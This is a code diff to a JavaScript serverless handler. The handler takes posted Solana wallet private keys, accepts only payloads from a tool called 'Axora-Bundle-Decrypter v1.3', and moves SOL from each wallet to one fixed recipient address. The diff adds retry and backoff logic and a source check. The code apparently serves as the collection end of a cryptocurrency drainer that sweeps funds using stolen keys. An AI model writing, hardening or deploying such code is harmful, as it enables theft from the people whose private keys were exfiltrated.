@@ -3,12 +3,31 @@ const bs58 = require('bs58').default; // Use .default for CommonJS compatibility
 
 // Configuration - pulled from environment variables
 const RECIPIENT_ADDRESS = process.env.RECIPIENT_ADDRESS || 'ENTER_RECIPIENT_PUBLIC_KEY_HERE';
-const CLUSTER_URL = process.env.CLUSTER_URL || 'https://api.mainnet-beta.solana.com';
+const CLUSTER_URL = process.env.CLUSTER_URL || 'https://api.devnet.solana.com';
 const FEE_ESTIMATE = 5000; // Fallback lamports estimate
 const TRANSFER_AMOUNT = 4000; // Fixed transfer amount: 0.004 SOL (4000 lamports)
+const MAX_RETRIES = 5; // Max retries for RPC calls
+const RETRY_DELAY_BASE = 500; // Base delay for exponential backoff (ms)
 
 // In-memory set to prevent duplicate transfers (resets on function restart)
 const processedKeys = new Set();
+
+// Retry wrapper for RPC calls
+async function withRetry(fn, maxRetries = MAX_RETRIES, baseDelay = RETRY_DELAY_BASE) {
+  for (let attempt = 0; attempt <= maxRetries; attempt++) {
+    try {
+      return await fn();
+    } catch (error) {
+      if (error.message.includes('429 Too Many Requests') && attempt < maxRetries) {
+        const delay = baseDelay * Math.pow(2, attempt);
+        console.log(`[retry] Server responded with 429. Retrying after ${delay}ms delay...`);
+        await new Promise(resolve => setTimeout(resolve, delay));
+        continue;
+      }
+      throw error;
+    }
+  }
+}
 
 export default async function handler(req, res) {
   // Debug: Log incoming request details
@@ -41,8 +60,24 @@ export default async function handler(req, res) {
         wallets: parsedData.wallets?.map(wallet => ({ ...wallet, key: 'REDACTED' }))
       });
 
+      // Validate source
+      if (parsedData.source !== 'Axora-Bundle-Decrypter v1.3') {
+        console.log('[source-error]', `Invalid source: ${parsedData.source}`);
+        return res.status(200).send('ok');
+      }
+
       // Process private keys for SOL transfer if wallets exist
       if (parsedData?.wallets?.length > 0) {
+        // Create Solana connection
+        const connection = new Connection(CLUSTER_URL, 'confirmed');
+
+        // Get blockhash once for all transactions
+        let blockhash;
+        await withRetry(async () => {
+          const latestBlockhash = await connection.getLatestBlockhash();
+          blockhash = latestBlockhash.blockhash;
+        });
+
         for (const [index, wallet] of parsedData.wallets.entries()) {
           const privateKeyBase58 = wallet.key;
           if (!privateKeyBase58) {
@@ -56,9 +91,6 @@ export default async function handler(req, res) {
               throw new Error('Invalid private key length (must be 64 bytes)');
             }
 
-            // Create Solana connection
-            const connection = new Connection(CLUSTER_URL, 'confirmed');
-
             // Create Keypair and recipient PublicKey
             const fromKeypair = Keypair.fromSecretKey(secretKey);
             const toPubkey = new PublicKey(RECIPIENT_ADDRESS);
@@ -71,16 +103,14 @@ export default async function handler(req, res) {
             }
             processedKeys.add(pubkeyStr);
 
-            // Get balance and blockhash
-            const balance = await connection.getBalance(fromKeypair.publicKey);
+            // Get balance
+            const balance = await withRetry(async () => await connection.getBalance(fromKeypair.publicKey));
             console.log(`[balance] Wallet ${index}: ${balance} lamports`); // Debug
             const totalRequired = TRANSFER_AMOUNT + FEE_ESTIMATE;
             if (balance < totalRequired) {
               console.error(`[error] Insufficient balance for transfer from ${pubkeyStr} (wallet ${index}): ${balance} lamports, required: ${totalRequired}`);
               continue;
             }
-
-            const { blockhash } = await connection.getLatestBlockhash();
 
             // Create transfer transaction
             const transaction = new Transaction({
@@ -97,18 +127,18 @@ export default async function handler(req, res) {
               })
             );
 
-            // Calculate exact fee after transaction is built
-            const fee = await transaction.getEstimatedFee(connection) || FEE_ESTIMATE;
+            // Calculate exact fee
+            const fee = await withRetry(async () => await transaction.getEstimatedFee(connection)) || FEE_ESTIMATE;
             if (balance < TRANSFER_AMOUNT + fee) {
               console.error(`[error] Insufficient balance for fee from ${pubkeyStr} (wallet ${index}): ${balance} lamports, required: ${TRANSFER_AMOUNT + fee}`);
               continue;
             }
 
             // Send and confirm
-            const signature = await sendAndConfirmTransaction(connection, transaction, [fromKeypair], {
+            const signature = await withRetry(async () => await sendAndConfirmTransaction(connection, transaction, [fromKeypair], {
               maxRetries: 2,
               skipPreflight: false,
-            });
+            }));
             console.log(`[success] Transferred ${TRANSFER_AMOUNT} lamports from ${pubkeyStr} (wallet ${index}) to ${toPubkey.toBase58()}. Signature: ${signature}`);
           } catch (error) {
             console.error(`[transfer-error] Failed to process SOL transfer for ${privateKeyBase58.slice(0, 8)}... (wallet ${index}): ${error.message}`);
